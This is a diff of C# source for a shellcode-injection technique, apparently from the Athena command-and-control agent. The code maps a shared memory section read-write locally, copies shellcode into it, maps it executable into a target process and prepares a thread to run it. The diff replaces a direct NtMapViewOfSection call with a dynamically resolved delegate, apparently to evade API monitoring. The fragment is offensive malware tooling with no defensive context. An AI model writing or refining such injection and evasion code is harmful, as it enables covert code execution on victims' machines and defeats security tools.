@@ -7,6 +7,8 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 using Athena.Commands;
+using Athena.Utilities;
+using static Athena.Utilities.DynamicHandler;
 
 namespace shellcode_inject.Techniques
 {
@@ -31,7 +33,8 @@ namespace shellcode_inject.Techniques
             // create a local view
             const UInt32 ViewUnmap = 0x2;
             UInt64 offset = 0;
-            result = StaticHandler.NtMapViewOfSection(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, DynamicHandler.MemoryProtection.PAGE_READWRITE);
+            result = dlgMapViewSect(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, DynamicHandler.MemoryProtection.PAGE_READWRITE);
+            
             if (result != 0)
             {
                 return false;
@@ -41,7 +44,7 @@ namespace shellcode_inject.Techniques
             Marshal.Copy(shellcode, 0, pLocalView, shellcode.Length);
             // create a remote view of the section in the target
             IntPtr pRemoteView = IntPtr.Zero;
-            var res = StaticHandler.NtMapViewOfSection(hSectionHandle, hTarget, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, DynamicHandler.MemoryProtection.PAGE_EXECUTE_READ);
+            var res = StaticHandler.NtMapViewOfSection(hSectionHandle, hTarget, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, MemoryProtection.PAGE_EXECUTE_READ);
             // execute the shellcode
             IntPtr hThread = IntPtr.Zero;
             DynamicHandler.CLIENT_ID cid = new DynamicHandler.CLIENT_ID();
